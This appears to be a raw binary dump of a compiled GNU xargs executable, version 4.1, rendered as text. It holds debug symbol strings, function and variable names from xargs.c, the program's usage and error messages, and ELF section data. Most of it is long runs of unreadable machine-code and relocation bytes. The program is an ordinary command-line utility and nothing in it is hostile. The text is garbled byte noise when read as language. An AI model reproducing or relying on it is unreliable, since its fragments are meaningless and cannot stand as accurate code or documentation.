:T45=e_PC_LINK_MAX:0,_PC_MAX_CANON:1,_PC_MAX_INPUT:2,\ _PC_NAME_MAX:3,_PC_PATH_MAX:4,_PC_PIPE_BUF:5,\ _PC_CHOWN_RESTRICTED:6,_PC_NO_TRUNC:7,_PC_VDISABLE:8,\ _PC_ASYNC_IO:9,_PC_PRIO_IO:10,_PC_SYNC_IO:11,;  :T46=e_SC_ARG_MAX:0,_SC_CHILD_MAX:1,_SC_CLK_TCK:2,\ _SC_NGROUPS_MAX:3,_SC_OPEN_MAX:4,_SC_STREAM_MAX:5,\ _SC_TZNAME_MAX:6,_SC_JOB_CONTROL:7,_SC_SAVED_IDS:8,\ _SC_VERSION:9,_SC_PAGESIZE:10,_SC_BC_BASE_MAX:11,\ _SC_BC_DIM_MAX:12,_SC_BC_SCALE_MAX:13,_SC_BC_STRING_MAX:14,\ _SC_COLL_WEIGHTS_MAX:15,_SC_EQUIV_CLASS_MAX:16,_SC_EXPR_NEST_MAX:17,\ _SC_LINE_MAX:18,_SC_RE_DUP_MAX:19,_SC_2_VERSION:20,\ _SC_2_C_BIND:21,_SC_2_C_DEV:22,_SC_2_FORT_DEV:23,\ _SC_2_FORT_RUN:24,_SC_2_SW_DEV:25,_SC_2_LOCALEDEF:26,\ _SC_AIO_LISTIO_MAX:27,_SC_AIO_MAX:28,_SC_AIO_PRIO_DELTA_MAX:29,\ _SC_DELAYTIMER_MAX:30,_SC_MQ_OPEN_MAX:31,_SC_MQ_PRIO_MAX:32,\ _SC_RTSIG_MAX:33,_SC_SEM_NSEMS_MAX:34,_SC_SEM_VALUE_MAX:35,\ _SC_SIGQUEUE_MAX:36,_SC_TIMER_MAX:37,_SC_ASYNCHRONOUS_IO:38,\ _SC_FSYNC:39,_SC_MAPPED_FILES:40,_SC_MEMLOCK:41,\ _SC_MEMLOCK_RANGE:42,_SC_MEMORY_PROTECTION:43,_SC_MESSAGE_PASSING:44,\ _SC_PRIORITIZED_IO:45,_SC_PRIORITY_SCHEDULING:46,\ _SC_REALTIME_SIGNALS:47,_SC_SEMAPHORES:48,_SC_SHARED_MEMORY_OBJECTS:49,\ _SC_SYNCHRONIZED_IO:50,_SC_TIMERS:51,;  :T47=e_CS_PATH:0,; sigset_t:t5 __sighandler_t:t23 sigaction:T48=s16sa_handler:23,0,32;sa_mask:5,32,32;\ sa_flags:5,64,32;sa_restorer:49=*50=f19,96,32;; sig_atomic_t:t1 SignalHandler:t23 __WAIT_STATUS:t51=u4__uptr:52=*53=xuwait:,0,32;__iptr:39,0,32;; wait:T53=u4w_status:1,0,32;__wait_terminated:54=s4__w_termsig:4,0,7;\ __w_coredump:4,7,1;__w_retcode:4,8,8;:4,16,16;;,0,32;\ __wait_stopped:55=s4__w_stopval:4,0,8;__w_stopsig:4,8,8;\ :4,16,16;;,0,32;; wchar_t:t3 div_t:t56=s8quot:1,0,32;rem:1,32,32;; ldiv_t:t57=s8quot:3,0,32;rem:3,32,32;; __compar_fn_t:t58=*59=f1 comparison_fn_t:t58 qelem:T60=s12q_forw:61=*60,0,32;q_back:61,32,32;\ q_data:36,64,8;; boolean:t1 lineno:S1 replace_pat:S25 rplen:S4 eof_str:S25 lines_per_exec:S3 args_per_exec:S3 exit_if_size_exceeded:S1 cmd_argv:S62=*25 cmd_argv_alloc:S1 cmd_argc:S1 cmd_argv_chars:S1 initial_argc:S1 initial_argv_chars:S1 initial_args:S1 proc_max:S1 procs_executed:S1 procs_executing:S1 pids:S63=*1 pids_alloc:S1 child_error:S1 print_command:S1 query_before_executing:S1 longopts:S64=ar1;0;-1;37 main:F19 argc:p1 argv:p62 optc:r1 always_run_command:r1 orig_arg_max:r3 default_cmd:25 read_args:65=*66=f1 i:r1 len:r4 arglen:r67=*4 read_line:f1 eof:V1 state:r1 prevc:1 quotc:1 c:r1 first:1 len:r1 p:r25 endbuf:25 read_string:f1 eof:V1 len:r1 p:r25 endbuf:r25 c:r1 do_insert:f19 arg:p25 arglen:p4 lblen:p4 arg:r25 insertbuf:V25 p:r25 bytes_left:1 len:r4 s:25 push_arg:f19 arg:p25 len:p4 arg:r25 len:r4 print_args:f1 ask:p1 i:r1 tty_stream:V68=*35 c:r1 savec:r1 do_exec:f19 child:r1 add_proc:f19 pid:p1 pid:r1 i:r1 wait_for_proc:f19 all:p1 all:r1 i:r1 status:1 pid:r1 __u:r69=u4__in:1,0,32;__i:1,0,32;; __u:r70=u4__in:1,0,32;__i:1,0,32;; parse_num:f3 str:p25 option:p1 min:p3 max:p3 /usr/include/stdlib.h xargs.c str:r25 max:r3 eptr:25 val:r3 __nptr:r38 env_size:f3 envp:p62 envp:r62 len:r3 usage:f19 stream:p68 status:p1 stream:r68 status:r1 program_name:G25 linebuf:S25 arg_max:S3 argbuf:S25   _ 6M          0   I         e   A         i   7         l   .         n   "          p             r            s              t              x             P              v              h                   help version max-procs exit verbose max-chars no-run-if-empty interactive max-args max-lines replace eof null /bin/echo environment is too large for exec +0e::i::l::n:prs:txP: {} GNU xargs version %s
 double single unmatched %s quote argument line too long command too long can not fit single argument within argument list size limit argument list too long %s  r /dev/tty ?... cannot fork %s error waiting for child process %s: exited with status 255; aborting %s: stopped by signal %d %s: terminated by signal %d %s: invalid number for -%c option
 %s: value for -%c option must be >= %ld
 %s: value for -%c option must be < %ld
 Usage: %s [-0prtx] [-e[eof-str]] [-i[replace-str]] [-l[max-lines]]
       [-n max-args] [-s max-chars] [-P max-procs] [--null] [--eof[=eof-str]]
       [--replace[=replace-str]] [--max-lines[=max-lines]] [--interactive]
       [--max-chars=max-chars] [--verbose] [--exit] [--max-procs=max-procs]
       [--max-args=max-args] [--no-run-if-empty] [--version] [--help]
       [command [initial-arguments]]
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .stab .rel.stab .stabstr .rodata .rel.rodata .comment                                                      4                    !   	           x\  (              +               `                  1   	           h                 ;             H                    @              H                    F              \  H!  	             L   	           h  x              V              2                   _             8L                   g   	            j  h      
         s              &Q                                  8Q  |                                4T  P     3         	              Y                                               	                                  "           *           9           G           ]           f            u   $        ~   (           ,           0           4           8           <           @           D           H           L           P          T        #         
 ,  d      6           >  T  :     G  h       S    $     Y         c           k           r  
  _    {          8	         |  2      X          \                                 p  7                          
                                                                                    	                     d                                                                                           &             -             2             >             E             M             T             _             g             n             x                                                                                                                                                                                                                 xargs.c lineno replace_pat rplen eof_str lines_per_exec args_per_exec exit_if_size_exceeded cmd_argv cmd_argv_alloc cmd_argc cmd_argv_chars initial_argc initial_argv_chars initial_args proc_max procs_executed procs_executing pids pids_alloc child_error print_command query_before_executing longopts read_line arg_max env_size read_string usage parse_num linebuf argbuf push_arg do_exec do_insert wait_for_proc eof.38 eof.41 insertbuf.44 tty_stream.49 print_args add_proc main program_name environ error getopt_long optarg _IO_stdout_ version_string printf exit _IO_stderr_ optind xmalloc signal _IO_stdin_ __uflow strcmp __ctype_b strstr strncpy strcpy xrealloc fprintf fopen errno fputs fflush __overflow fork execvp _exit memset wait __strtol_internal     +     ,  "   4  -   -  7   5  D   -  K   -  W   +  `   6  k   +  p   +  }   7     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,     ,    ,    ,    ,    ,    ,    ,    ,     ,  $  ,  (  ,  ,  ,  0  ,  4  ,  8  ,  <  ,  @  ,  D  ,  H  ,  L  ,  P  ,  T  ,  X  ,  \  ,  `  ,  d  ,  h  ,  l  ,  p  ,  t  ,  x  ,  |  ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    ,    8    8    .    .    9    8    8    .  "  .  &  +  ,  .  6  .  F  8  T  8  _  .  j  .  t  .  ~  .    8    .    .    .    8    -    .    .    .    8  &  .  5  :  ;  +  @  ;  G  <  O  =  b  .  k  .  t  .    >    >    -    ?    -    -    ?    -    @    .    >    >    >    >    .  '  .  ,  .  1  .  6  .  J  .  R  .  X  .  e  .  q  .  w  .    .    ?    >    .    .    >    >  X  .  ^  <    -    -    .    .    A    A    A    B    A    A    .    -    -    .    .    -  '  C  >  .  K  -    D    D    .    -    -    .    .    -    C    .  :  .  C  -  R  .  Z  D  |  -    .    .    -    C    -    -  
  +    +    +  $  6  @  +  I  6  p  -  x  -  ~  .    .    A    A    A    B    A    A    .    -    .    -    .    -  	  +  	  6  F	  -  P	  -  X	  -  _	  ?  d	  -  m	  -  u	  .  |	  E  	  F  	  -  	  G  	  .  	  +  	  6  	  -  	  -  (
  .  .
  -  6
  .  >
  .  D
  .  K
  +  T
  6  ]
  .  f
  .  o
  .  x
  .  
  +  
  6  
  .  
  .  
  .  
  .  
  .  
  .  
  .  
  .  
  .  
  ?  
  .  
  .  
  .    .    H    .     .  %  .  2  .  9  .  ?  .  E  -  K  .  T  .  [  G  a  .  y  .    +    =    I    .    -    +    +    J    -    +    K    6    =    +    L    =    M    -    B    -  7  -  E  B  Q  -  u  =  {  =    =    N    =    =    .    .    .    .    .    .    O    K  $  .  A  +  F  K  N  6  V  .  _  P  d  .  l  +  q  K  y  6    K    Q    .    .    .    .    .    .    .    .    .    .    ?    .    .  #  .  ,  .  2  H  7  .  ?  .  T  .  Z  R  _  .  h  .  n  .    .    S    +    K    6    .    .    .    .    .    .    <    .     +  )  6  A  .  I  +  R  6  l  .  t  +  }  6    .    .    T    4    +    =    I  
  4    +  &  4  ,  +  1  =  6  I  =  =    4    +    I    <     +      ,  ,   ,  	  .  	  .  	  .  	  .  	  .  	  .  	  .  	  .  
  .  
  .  
  .  (
  .  4
  .  @
  .  L
  .  X
  .  d
  .  p
  .  |
  .  
  .  
  .  
  .  
  +  
  3    ,    .  d  ,  x  .    ,    -     ,  \  ,    -    ,    ,    ,    ,    ,    ,     ,     ,   !  -  ,!  -  8!  -  D!  ,     +     +  $   +  4   +  D   +  T   +  d   +  t   +     +     +     +     +     +  ELF              4   q      4    (      4   44                                       !  !           !               "              /lib/ld-linux.so.1  %   /                                        (   '                      ,   "   )               %       *       $      .      &       #                                      +              	                                                         
                        -       !                                                               (   "      #      "   (6      .        7   (     A   ,      G   8l     Y   0T     e   T     q   H$      |   X    "              h    "                       xF                      "      T        4        8            "               T                      "          "         "     I        8       (      !       
 '  84      .  (     D  H      I  X>      T  h      Z  x    "   `  m     g      "   p  ,     w       ~  (       (       T      libc.so.5 strcpy printf strerror getopt_long _DYNAMIC __ctype_b errno __strtol_internal _IO_stdout_ _IO_stderr_ __overflow malloc optarg fflush __environ _init __libc_init environ fprintf _IO_stdin_ __fpu_control optind wait strstr signal strncpy realloc fork fopen memset __uflow strcmp _fini atexit _GLOBAL_OFFSET_TABLE_ exit __setfpucw _exit fputs execvp vfprintf _errno _etext _edata __bss_start _end   (  0	  
      4  8  ,*  4  8  <  @  D  H  L  P  T  X  \  `  d  h  l  p  t  x  |     "  $  %  &  '  (  )  {    5,%0    %4h    %8h   %<h   %@h   %Dh    %Hh(   %Lh0   %Ph8   p%Th@   `%XhH   P%\hP   @%`hX   0%dh`    %hhh   %lhp    %phx   %th   %xh   %|h   %h   %h   %h   %h   %h   p%h   `%h   P%h   @        Y1UUUPSQ       D$4Plh:I   P7[&    &       &    S$=$ t; u[6UWVS   EEE P  H P  Q  H)Hhj jP  j hhMQEPS  H  $6h(P_D`N4E= t|    mj h0  = t
,        %= tjjjlPR  
           jjjnP          6SjjsP  Hv    y       _v 1Ujj jPP  66Ph/pj jh8  = u	= t
   M98u8    E   EEH@P
  DH@P  Lj j=    M98}8068MQR  8E98|    6Mt(= t9E      9u   =         EEP	  89]~!0v M<IC9]0=H6EtL8BREP  O8C9]~WQEP  C9]]  v j%	  P6UWVS   E    E   5DHU)UM=    ]9whv uu   95Dt9 F+5D} t3= t*D8uSQu
   =    VDP     6t#	tL        (X
C1
   (UPu95Du   6 F+5D= tAD8u/SQu!   } ,  %  = uVDP  = u{(Xu
tCvu^ F+5D= t$=D8uWQ2jVDPW  5D   E    't	"tX6\uQ      ]v 
u"L}"uEPhSj j  9]u
1y19uwhfj jg  FV6e[^_]6UWVSD=H+=O= uE9wh!60u   9DuTu, C+D= uSDP  'v 9rhfj j  Ccv e[^_]6UWVSuHJU=< uH@PQ  <=<v PVE]t))]} ~>SVW} t$U)U} ~DPW5}> u> th}j j   G+<P<P
   e[^_]UWVS]u   9Hsa= u9uhj j\  = u= t#= u	= thj j'    = u!= t+9u  9N= u@   h     '=PP  u    -LSQE5e[^_]US1PhhCH9|}    =@ u0hh@uh,Pj  hh4h@B9BwR@P@t6v 
t.@B9BwR{@P@uytYu1   ,9wj
hg 
1]]Uj j \=  tj   = t9
j   =  u= tj e6}=,u= t	j J  tt]h,Pjb  P P Ph,Pj 7  ~   =,u   P{v P   ]6UVSu19~< t	C99usu)u@   P  )v PP  )Pj     PV4e[^]UVSu=   EP}h,Pj  19~69t	B99t    E~tu
EPE=   u Ph$j j|  E<u"%   P PhIj j}^  UBf= wP Phbj j}3  } t
{   t= e[^]6UWVS]uEj j
PS9]tE8 tURPPh~h<@69}~URURPPh6|*9~&VURPPhhjhJ   e[^_]6UWSU1: t6:0M: ue[_]6USE]PRhPSB6UWVS}]u= t%v h02PPhh=EPVh;tSPhh9wj
h 
ht	Wv e[^_]US1} ujuuhj P
]]US]SCuS]]v USE]u
S6SPuSx]]S=t;u[6              _ 6        0          e          i          l          n           p           r          s           t           x          P           v   |        h                   help version max-procs exit verbose max-chars no-run-if-empty interactive max-args max-lines replace eof null /bin/echo environment is too large for exec +0e::i::l::n:prs:txP: {} GNU xargs version %s
 double single unmatched %s quote argument line too long command too long can not fit single argument within argument list size limit argument list too long %s  r /dev/tty ?... cannot fork %s error waiting for child process %s: exited with status 255; aborting %s: stopped by signal %d %s: terminated by signal %d %s: invalid number for -%c option
 %s: value for -%c option must be >= %ld
 %s: value for -%c option must be < %ld
 Usage: %s [-0prtx] [-e[eof-str]] [-i[replace-str]] [-l[max-lines]]
       [-n max-args] [-s max-chars] [-P max-procs] [--null] [--eof[=eof-str]]
       [--replace[=replace-str]] [--max-lines[=max-lines]] [--interactive]
       [--max-chars=max-chars] [--verbose] [--exit] [--max-procs=max-procs]
       [--max-args=max-args] [--no-run-if-empty] [--version] [--help]
       [command [initial-arguments]]
 4.1 %s:  : %s memory exhausted                                                                                                                        .>N^n~.>N^n~                  0   @
                     (                     @                     <          d   T0   d   T8          Z          l                                                 R         p                                                      	         6         Q         m                     v                                8         ^            .        1        4        
                                      2        D        Z        l        ~                                                                !   %     Q        \        e        n        w                                           	        
                                                                                             "   $     -   )     :   .     D   3     O   8     [   <     f   =     q   >     z   ?        B        C        D        E                          N        O        P     *   Q     7   R     B   S     O   V     Z   W     g        r                                                                           "        #        '        (        )     )   *     7   +     E   ,     R   -     e   2     s   3        4        5        6        7        8        9              	         	         ]	         l	         	         	         
         5
         
         
         
         6         K        X   L     a   M     k                                                              $     7   '     B   (     M   )     X   *     d   +     q   ,     |   -        .        /        0        =        >        ?        B        C                 P              W                                    !         U                                    @         u                                     ^                                    R                                    	           P     (         ^            ,        .        B              6         m                             3        :            *   #    >         p            v       &    &    &    &    &    &    &    &    &    &  &  &  8  &  H  &  ^  &  n  &  z  &    &    &    &    &    &    &     &    $  T              &  D      &  D  	   &  D 	   &  D    &  D    &  D    &  D &   &  D +   &  D 5   &  D O   &  D V   &  D h   &  D    &  D   &  D   &  D !  &  D "  &  D $  &  D %  &  D (  &  D +  &  D ,  &  D .   &  D 0*  &  D 14  &  D 2>  &  D 5D  &  D 6M  &  D 8h  &  D :r  &  D ;|  &  D <  &  D ?  &  D A  &  D B  &  D C  &  D F  &  D G  &  D N  &  D O  &  D R  &  D S  &  D T  &  D W  &  D X  &  D [  &  D \*  &  D _4  &  D `D  &  D cL  &  D dX  &  D e[  &  D g`  &  D hr  &  D j|  &  D l  &  D m  &  D n  &  D q  &  D r  &  D u  &  D w  &  D y  &  D z  &  D y  &  D {  &  D |&  &  D }0  &  D :  &  D H  &  D ^  &  D c  &  D m  &  D p  &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D ,  &  D =  &  D F  &  D K  &  D P  &  D P  &  D W  &  D d  '  @     /  @    E  @    U   d   &     	   x  @    }  @      @    &       &     P  &     d    $ &  D     &  D 	   &  D 	   &  D    &  D    &  D    &  D !   &  D '   &  D >   &  D L   &  D O   &  D ~   &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D M  &  D O  &  D X  &  D f  &  D l  &  D t  &  D y  &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D I  &  D U  &  D [  &  D `  &  D g  &  D p  &  D    &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D   &  D     &   @            @         @      @       &     	   &         $ '&  D '    &  D (   &  D *   &  D ,   &  D .   &  D 2$   &  D 3R   &  D 5W   &  D 6a   &  D 7i   &  D >p   &  D @t   &  D Az   &  D B~   &  D C   &  D D   &  D E   &  D G   &  D H   &  D I   &  D J   &  D K     & (  @ )     @ *     @ ,   &          @ 2   &     $   &        &          $ Y   Y      Z      [   &  D \    &  D _   &  D a   &  D c   &  D d   &  D e3   &  D i<   &  D j<   &  D kK   &  D nN   &  D kQ   &  D lU   &  D oY   &  D p\   &  D sb   &  D tj   &  D ul   &  D wn   &  D yw   &  D z}   &  D |   &  D }   &  D ~   &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  @ Y   .  ( _<  @ `   <   a&        }  @ i   I   j&     <   &        &        N  $ d      [      &  D     &  D    &  D    &  D $   &  D :   &  D K   &  D o   &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D   &  D 
  &  D   &  D (  &  D H  &  D O  &  D U  &  @    }  @    b  $ p      &  D     &  D    &  D    &  D    &  D     &  D .   &  D 8   &  D 8   &  D A   &  D U   &  D \   &  D q   &  D    &  D    &  D    &  D    &  D    &  D    &  D   &  D   &  D .  &  D 0  x  @    &        w  ( @  @      @    &     8   &       &     0    $ &  D     &  D    &  D    &  D    &  D *   &  D @   &  D J   &  D \   &  D f   &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D    &  D   &  D     @     &        &         $       &  D     &  D    &  D    &  D '   &  D /   &  D 3   &  D F   &  D T   &  D \   &  D k   &  D    &  D    &  D !   &  D "   &  D #   &  D $     @    x  @    &        &          $ ,   ,   &  D -    &  D .   &  D 0   &  D 4   &  D 6   &  D 7#   &  D 8*   &  D <?   &  D >^   &  D ?^   &  D Bf   &  D Cr   &  D Ex   &  D F   &  D G   &  D H   &  D I   &  D J   &  D K   &  D L   &  D M  &  D N  &  D P  &  D R  &  D S)    @ ,   &        x  @ 0      0&          @ 4   &        &     ^   &     x   &     x   &        &        &        &        &        &          @ I    &        &        &        &          @ K   &        &        &        &        &       &       &       &     )  2  $ \?   \   G   ]   Q   ^   X   _   &  D `    